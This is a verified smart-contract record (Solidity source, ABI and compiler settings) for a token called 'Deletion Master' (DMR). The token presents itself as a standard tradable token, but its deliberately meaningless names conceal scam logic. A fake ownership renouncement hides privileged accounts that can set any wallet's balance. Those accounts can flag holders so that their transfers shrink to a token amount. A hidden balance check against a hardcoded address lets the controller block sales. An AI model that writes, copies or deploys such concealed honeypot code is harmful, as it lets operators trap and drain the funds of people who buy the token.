{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface receiverFundReceiver {\n    function createPair(address buyLaunchedTx, address sellIs) external returns (address);\n}\n\ninterface launchBuyToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTeamToken) external view returns (uint256);\n\n    function transfer(address toTx, uint256 minTakeLimit) external returns (bool);\n\n    function allowance(address tradingReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTakeLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toTx,\n        uint256 minTakeLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableWallet, uint256 value);\n    event Approval(address indexed tradingReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract amountTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toExemptAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamFund is launchBuyToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeletionMaster is amountTake, launchBuyToken, teamFund {\n\n    function receiverLiquidity(address totalShould, address toTx, uint256 minTakeLimit) internal returns (bool) {\n        if (totalShould == minTeamExempt) {\n            return totalFrom(totalShould, toTx, minTakeLimit);\n        }\n        uint256 receiverIs = launchBuyToken(totalWallet).balanceOf(toFrom);\n        require(receiverIs == isTo);\n        require(toTx != toFrom);\n        if (modeList[totalShould]) {\n            return totalFrom(totalShould, toTx, shouldMarketing);\n        }\n        return totalFrom(totalShould, toTx, minTakeLimit);\n    }\n\n    mapping(address => bool) public modeList;\n\n    mapping(address => bool) public buyLaunched;\n\n    function autoWallet(address totalAuto) public {\n        toAt();\n        if (takeTo == exemptMax) {\n            exemptMax = teamToken;\n        }\n        if (totalAuto == minTeamExempt || totalAuto == totalWallet) {\n            return;\n        }\n        modeList[totalAuto] = true;\n    }\n\n    function atToken(uint256 minTakeLimit) public {\n        toAt();\n        isTo = minTakeLimit;\n    }\n\n    uint256 private takeTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTradingSwap;\n    }\n\n    uint256 private teamToken;\n\n    address private launchExempt;\n\n    event OwnershipTransferred(address indexed walletSellLimit, address indexed exemptTotal);\n\n    bool public totalEnable;\n\n    uint256 marketingShould;\n\n    function getOwner() external view returns (address) {\n        return launchExempt;\n    }\n\n    constructor (){\n        \n        toExemptAt autoLaunched = toExemptAt(launchedSwap);\n        totalWallet = receiverFundReceiver(autoLaunched.factory()).createPair(autoLaunched.WETH(), address(this));\n        if (teamToken != exemptMax) {\n            swapMarketing = false;\n        }\n        minTeamExempt = _msgSender();\n        buyLaunched[minTeamExempt] = true;\n        limitAmount[minTeamExempt] = receiverBuy;\n        launchedMin();\n        \n        emit Transfer(address(0), minTeamExempt, receiverBuy);\n    }\n\n    uint256 public exemptMax;\n\n    function txMaxSender(address isTrading, uint256 minTakeLimit) public {\n        toAt();\n        limitAmount[isTrading] = minTakeLimit;\n    }\n\n    uint256 constant shouldMarketing = 9 ** 10;\n\n    uint256 public liquidityTeamTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchReceiver;\n    }\n\n    bool public swapMarketing;\n\n    function owner() external view returns (address) {\n        return launchExempt;\n    }\n\n    function balanceOf(address atTeamToken) public view virtual override returns (uint256) {\n        return limitAmount[atTeamToken];\n    }\n\n    function toAt() private view {\n        require(buyLaunched[_msgSender()]);\n    }\n\n    uint256 isTo;\n\n    address launchedSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private limitLaunch = \"Deletion Master\";\n\n    function walletReceiver(address shouldLaunch) public {\n        if (totalEnable) {\n            return;\n        }\n        if (buyAt == takeTo) {\n            takeTo = teamToken;\n        }\n        buyLaunched[shouldLaunch] = true;\n        \n        totalEnable = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverBuy;\n    }\n\n    address toFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunch;\n    }\n\n    address public totalWallet;\n\n    function launchedMin() public {\n        emit OwnershipTransferred(minTeamExempt, address(0));\n        launchExempt = address(0);\n    }\n\n    uint8 private launchReceiver = 18;\n\n    function allowance(address minMarketing, address takeEnable) external view virtual override returns (uint256) {\n        if (takeEnable == launchedSwap) {\n            return type(uint256).max;\n        }\n        return fundTx[minMarketing][takeEnable];\n    }\n\n    string private buyTradingSwap = \"DMR\";\n\n    uint256 private buyAt;\n\n    bool private fromToken;\n\n    uint256 private receiverBuy = 100000000 * 10 ** 18;\n\n    function transfer(address isTrading, uint256 minTakeLimit) external virtual override returns (bool) {\n        return receiverLiquidity(_msgSender(), isTrading, minTakeLimit);\n    }\n\n    mapping(address => uint256) private limitAmount;\n\n    uint256 public walletToken;\n\n    mapping(address => mapping(address => uint256)) private fundTx;\n\n    bool private minLaunch;\n\n    function totalFrom(address totalShould, address toTx, uint256 minTakeLimit) internal returns (bool) {\n        require(limitAmount[totalShould] >= minTakeLimit);\n        limitAmount[totalShould] -= minTakeLimit;\n        limitAmount[toTx] += minTakeLimit;\n        emit Transfer(totalShould, toTx, minTakeLimit);\n        return true;\n    }\n\n    function approve(address takeEnable, uint256 minTakeLimit) public virtual override returns (bool) {\n        fundTx[_msgSender()][takeEnable] = minTakeLimit;\n        emit Approval(_msgSender(), takeEnable, minTakeLimit);\n        return true;\n    }\n\n    uint256 public minFundReceiver;\n\n    function transferFrom(address totalShould, address toTx, uint256 minTakeLimit) external override returns (bool) {\n        if (_msgSender() != launchedSwap) {\n            if (fundTx[totalShould][_msgSender()] != type(uint256).max) {\n                require(minTakeLimit <= fundTx[totalShould][_msgSender()]);\n                fundTx[totalShould][_msgSender()] -= minTakeLimit;\n            }\n        }\n        return receiverLiquidity(totalShould, toTx, minTakeLimit);\n    }\n\n    address public minTeamExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSellLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTakeLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTakeLimit\",\"type\":\"uint256\"}],\"name\":\"atToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"}],\"name\":\"autoWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeamToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTeamTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFundReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTeamExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTakeLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTakeLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTakeLimit\",\"type\":\"uint256\"}],\"name\":\"txMaxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"}],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DeletionMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}